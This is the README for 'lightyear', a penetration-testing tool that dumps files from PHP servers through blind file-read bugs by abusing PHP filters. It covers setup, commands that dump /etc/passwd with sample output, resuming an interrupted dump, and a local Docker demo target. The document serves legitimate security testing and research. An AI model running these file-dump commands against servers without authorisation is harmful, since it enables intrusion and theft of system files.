# lightyear

A tool to dump files in tedious (blind) conditions using PHP filters, by [cfreal](https://twitter.com/cfreal_). It can be used to dump any file using a blind file read primitive in PHP, such as:

```php
get_image_size($_GET['image']);
```

# Usage

## Setup

The following dependencies are required to build the XML library (lxml).

```bash
sudo apt update
sudo apt-get install -y libxml2-dev libxslt-dev
```

```bash
$ git clone https://github.com/ambionics/lightyear
$ cd lightyear
$ pip install -r requirements.txt
```

## Running

```bash
$ code remote.py # edit Remote.oracle
$ ./lightyear.py test # test that your implementation works
$ ./lightyear.py /etc/passwd # dump a file!
```

To use, implement the `Remote.oracle()` method, and then test that it works properly by running `./lightyear.py test`.

## Resuming

If you interrupt and then restart a dump with the same destination file, the dump will resume.

```bash
$ ./lightyear.py /etc/passwd -o /tmp/passwd.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:58
[-] Execution interrupted (Ctrl-C) <----- PRESSED CTRL-C
[+] Dumped /etc/passwd to /tmp/z (got 198 bytes)
$ ./lightyear.py /etc/passwd -o /tmp/passwd.txt
[!] File exists, resuming dump at digit #265
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
>=
[+] Dumped /etc/passwd to /tmp/passwd.txt (got 840 bytes)
```


# Testing

A docker file is available in `demo/`. It provides a very simple Apache+PHP environment allowing you to test the tool.

```
$ docker build -t lightyear-demo ./demo
$ docker run -d --name lightyear-demo --rm -p 8000:80 lightyear-demo
$ ./lightyear.py /etc/passwd
```

# Improvements

- Concurrency
- Improve jump caching to truly reach minimum size and compute faster
- Combine with [wrapwrap](https://github.com/ambionics/wrapwrap)

# References

- [Blogpost describing the tool](https://www.ambionics.io/blog/lightyear-file-dump)